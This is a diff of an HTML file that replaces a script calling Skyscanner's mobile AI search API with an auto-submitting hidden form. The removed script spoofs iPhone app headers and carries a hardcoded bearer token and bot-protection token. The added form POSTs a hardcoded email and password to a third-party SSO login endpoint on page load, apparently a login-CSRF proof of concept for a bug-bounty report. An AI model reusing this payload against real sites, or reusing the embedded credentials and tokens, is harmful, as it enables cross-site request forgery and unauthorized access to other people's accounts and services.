@@ -1,65 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Search Example</title>
-</head>
 <body>
-  <div>
-    <h1>What kind of trip is on your mind?</h1>
-    <input type="text" id="queryInput" placeholder="Enter anything you like..." />
-    <button onclick="search()">✨ Search</button>
-  </div>
-
-  <script>
-    async function search() {
-      const query = document.getElementById("queryInput").value;
-      const currentDateTime = new Date();
-      const dateData = {
-        year: currentDateTime.getFullYear(),
-        month: currentDateTime.getMonth() + 1,
-        day: currentDateTime.getDate(),
-        hour: currentDateTime.getHours(),
-        minute: currentDateTime.getMinutes()
-      };
-
-      const data = JSON.stringify({
-        origin: "95673524",
-        query: query,
-        currentDateTime: dateData
-      });
-
-      try {
-        const response = await fetch("https://mobile.ds.skyscanner.net/g/discovery-ai/v1/llm-search", {
-          method: "POST",
-          headers: {
-            "Host": "mobile.ds.skyscanner.net",
-            "X-Skyscanner-Device-Class": "phone",
-            "X-Px-Authorization": "3:9b0e6b787828aef3f294d0d5474e8d0abcb78e3bc36018370592ec330420adeb:vEZxrwb5W8Mw4WhzwFs1YZPeEtttUaIEmGiJKTQB3hugwbRcXaO2Wvshul1h25pHJkeSWSKLU+gMsZcf8dJRig==:1000:QOx4Dn/KeSKVwUxL0gqdQJdshMMzNuckG2ePwSumXa16A9PGlDRhTSaBZP3Ip22m+7BEzAR7di62sAMWinmps524bssvaFJYOpXiaGTOWfS98cEvIwX5FJfM+Q+L0Kp1WlH1bh8taHBBoUM1CkvobB1M/2YATNpplvCNe8Km4mxl71DPZNwxNNTRA9nkB8njVAaD7+tTcnw8FVIxMX91FYw5VEqmwEfGnmcRkRFiKpA=",
-            "X-Skyscanner-Currency": "EUR",
-            "X-Px-Device-Model": "iPhone 13 Pro Max",
-            "X-Skyscanner-Locale": "en-US",
-            "X-Px-Device-Fp": "20409BFA-C06D-4588-B761-3F1F575B379A",
-            "User-Agent": "Skyscanner/7.124 (iPhone; iOS 17.7.1)",
-            "X-Skyscanner-Client-Type": "net.skyscanner.iphone",
-            "X-Skyscanner-Market": "ES",
-            "X-Px-Mobile-Sdk-Version": "3.1.5",
-            "X-Skyscanner-Device-Os-Version": "17.7.1",
-            "X-Skyscanner-Authenticated": "true",
-            "X-Px-Os-Version": "17.7.1",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjJRZk8zWTAxRzlFNkUycl9hbnZDayJ9.eyJodHRwczovL3NreXNjYW5uZXIubmV0L3V0aWQiOiJiZjFjZjMzZC02Mzc3LTRkMjctOTMzZS05MWEyZWUwNmU4NzIiLCJodHRwczovL3NreXNjYW5uZXIubmV0L2lzTmV3VXNlciI6dHJ1ZSwiaHR0cHM6Ly9za3lzY2FubmVyLm5ldC9jc3JmIjoiOTdiZWNjNmQ1N2I3YWYwNTJhMjAwYTQ0ODdlMmNhYjQiLCJodHRwczovL3NreXNjYW5uZXIubmV0L2xvZ2luVHlwZSI6ImVtYWlsIiwiaHR0cHM6Ly9za3lzY2FubmVyLm5ldC9pc1NvY2lhbCI6ZmFsc2UsImh0dHBzOi8vc2t5c2Nhbm5lci5uZXQvanRpIjoiODAxZjZmYzEtZTQzMC00YjUzLThkM2UtZDRmODE5NjU2ZDMzIiwiaXNzIjoiaHR0cHM6Ly9za3lzY2FubmVyLmV1LmF1dGgwLmNvbS8iLCJzdWIiOiJhdXRoMHw2NzFkMzBiNjM5M2MwOTljZjIxODk4ODAiLCJhdWQiOlsiaHR0cHM6Ly9nYXRld2F5LnNreXNjYW5uZXIubmV0L2lkZW50aXR5IiwiaHR0cHM6Ly9za3lzY2FubmVyLmV1LmF1dGgwLmNvbS91c2VyaW5mbyJdLCJpYXQiOjE3Mjk5Njk2MDksImV4cCI6MTcyOTk5ODQwOSwic2NvcGUiOiJwcm9maWxlIGVtYWlsIG9wZW5pZCBvZmZsaW5lX2FjY2VzcyIsImd0eSI6InBhc3N3b3JkIiwiYXpwIjoiZTJ6RlNhd3FSdGtENG5lYW90RUp1OGlpMEZzYjA2SFYifQ.YppN4c0x-8gUCe9qcb4eEQp9MrzATQ6OJIM8RF86yWlWXCvRZhs2XpEJEQH9KzeqLVJXcXJzwRyCwu82oATUAa3fkXZmk4gcX1UU_a5NXvwu2qzZGnYULngNUzBKrS6gyAWeAD3Lq4r8zOF8HkIdmWpdvncX89KmBdRm30cG0ovSs9A48HJA0bv9xNsFWpsiQw5RFkZ_areC9VZYw3edb44vd-88n7i1kFSQaXRLUYoVfuNNC-pklSPZQiKW7GQOHRv0WUH6gT-w9gM-eIWmtWAU_U3juByCVwcCT-W5gDUkg_0CAJ4y1uBchKKUFp_OMxk5YoTteOYeB3Pkd3pXbQ"
-          },
-          body: data
-        });
-
-        const result = await response.json();
-        console.log("Response:", result);
-      } catch (error) {
-        console.error("Error:", error);
-      }
-    }
-  </script>
+    <form id="csrfForm" action="https://sso.saytechnologies.com/v1/auth/login/" method="POST">
+        <input type="hidden" name="email" value="phrkstr@wearehackerone.com">
+        <input type="hidden" name="password" value="Saferefas123!">
+    </form>
+    <script>
+        document.getElementById('csrfForm').submit();
+    </script>
 </body>
 </html>
